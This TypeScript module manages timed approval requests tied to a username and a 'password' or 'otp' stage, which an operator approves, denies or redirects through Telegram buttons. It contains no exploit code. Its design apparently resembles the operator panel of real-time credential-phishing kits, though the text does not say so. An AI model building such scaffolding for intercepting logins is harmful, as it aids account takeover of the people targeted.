/**
 * Approval Webhook System
 * Manages pending approvals (Approve, Deny, Redirect) with 90-second timeout
 * Integrated with Telegram bot buttons for admin decisions
 */

import crypto from "crypto"
import { kv } from "@vercel/kv"

export type ApprovalAction = "approve" | "deny" | "redirect"

export interface ApprovalRequest {
  id: string
  username: string
  stage: "password" | "otp" // When approval is needed
  createdAt: number
  expiresAt: number
  action?: ApprovalAction
  decidedAt?: number
}

export interface ApprovalResponse {
  approved: boolean
  action?: ApprovalAction
  message?: string
  waitingFor?: number // milliseconds remaining
}

// In-memory store for pending approvals (in production, use Redis/DB)
const APPROVALS = new Map<string, ApprovalRequest>()
const KV_TTL_SECONDS = 120
const KV_KEY_PREFIX = "approval:"
const IS_KV_CONFIGURED = Boolean(process.env.KV_URL || process.env.KV_REST_API_URL)
let hasWarnedKvFallback = false

// Time limit for approval decision (seconds)
const APPROVAL_TIMEOUT = 90

/**
 * Generate unique approval ID
 */
function generateApprovalId(): string {
  return crypto.randomBytes(16).toString("hex")
}

function getApprovalKey(approvalId: string): string {
  return `${KV_KEY_PREFIX}${approvalId}`
}

function warnKvFallback() {
  if (!hasWarnedKvFallback) {
    hasWarnedKvFallback = true
    console.warn("Vercel KV is not configured; falling back to in-memory approval store")
  }
}

function getDecisionMessage(action: ApprovalAction): string {
  if (action === "approve") return "✅ Approved"
  if (action === "deny") return "❌ Denied"
  return "🔄 Redirected"
}

async function saveApprovalRecord(request: ApprovalRequest): Promise<void> {
  if (!IS_KV_CONFIGURED) {
    warnKvFallback()
    APPROVALS.set(request.id, request)
    return
  }

  await kv.set(getApprovalKey(request.id), JSON.stringify(request), { ex: KV_TTL_SECONDS })
}

async function getApprovalRecord(approvalId: string): Promise<ApprovalRequest | null> {
  if (!IS_KV_CONFIGURED) {
    warnKvFallback()
    return APPROVALS.get(approvalId) || null
  }

  const raw = await kv.get<string>(getApprovalKey(approvalId))
  if (!raw) return null

  try {
    return JSON.parse(raw) as ApprovalRequest
  } catch (error) {
    console.error("Failed to parse approval record from KV:", error)
    return null
  }
}

/**
 * Create a new approval request
 */
export async function createApprovalRequest(
  username: string,
  stage: "password" | "otp",
  approvalId?: string
): Promise<ApprovalRequest> {
  const id = approvalId || generateApprovalId()
  const now = Date.now()
  const request: ApprovalRequest = {
    id,
    username,
    stage,
    createdAt: now,
    expiresAt: now + APPROVAL_TIMEOUT * 1000,
  }

  await saveApprovalRecord(request)

  return request
}

/**
 * Check approval status
 */
export async function checkApprovalStatus(approvalId: string): Promise<ApprovalResponse> {
  const request = await getApprovalRecord(approvalId)

  if (!request) {
    return {
      approved: false,
      message: "Approval request not found",
    }
  }

  const now = Date.now()

  // Approval decision already made
  if (request.action) {
    return {
      approved: request.action === "approve",
      action: request.action,
      message: getDecisionMessage(request.action),
    }
  }

  // Check if expired
  if (now > request.expiresAt) {
    request.action = "deny"
    request.decidedAt = now
    await saveApprovalRecord(request)
    return {
      approved: false,
      action: "deny",
      message: "⏰ Approval timeout - access denied",
    }
  }

  // Still waiting
  const remaining = request.expiresAt - now
  return {
    approved: false,
    waitingFor: remaining,
    message: `⏳ Awaiting approval... ${Math.ceil(remaining / 1000)}s`,
  }
}

/**
 * Process approval decision from webhook/button
 */
export async function processApprovalDecision(
  approvalId: string,
  action: ApprovalAction
): Promise<ApprovalResponse> {
  const request = await getApprovalRecord(approvalId)

  if (!request) {
    return {
      approved: false,
      message: "Approval request not found or expired",
    }
  }

  const now = Date.now()
  if (now > request.expiresAt && !request.action) {
    request.action = "deny"
    request.decidedAt = now
    await saveApprovalRecord(request)
    return {
      approved: false,
      action: "deny",
      message: "⏰ Approval timeout - access denied",
    }
  }

  if (request.action) {
    return {
      approved: request.action === "approve",
      action: request.action,
      message: "Decision already made",
    }
  }

  request.action = action
  request.decidedAt = now
  await saveApprovalRecord(request)

  return {
    approved: action === "approve",
    action,
    message: getDecisionMessage(action),
  }
}

/**
 * Get approval request details (for Telegram webhook)
 */
export async function getApprovalRequest(approvalId: string): Promise<ApprovalRequest | null> {
  return getApprovalRecord(approvalId)
}

/**
 * Clean up expired approvals
 */
export async function cleanupExpiredApprovals(): Promise<number> {
  if (IS_KV_CONFIGURED) return 0
  let cleaned = 0
  const now = Date.now()

  for (const [id, request] of APPROVALS.entries()) {
    if (now > request.expiresAt && !request.action) {
      APPROVALS.delete(id)
      cleaned++
    }
  }

  return cleaned
}

/**
 * Get all pending approvals (for admin dashboard)
 */
export async function getPendingApprovals(): Promise<ApprovalRequest[]> {
  if (IS_KV_CONFIGURED) return []
  const now = Date.now()
  return Array.from(APPROVALS.values()).filter(
    (req) => !req.action && now <= req.expiresAt
  )
}

export default {
  createApprovalRequest,
  checkApprovalStatus,
  processApprovalDecision,
  getApprovalRequest,
  cleanupExpiredApprovals,
  getPendingApprovals,
}
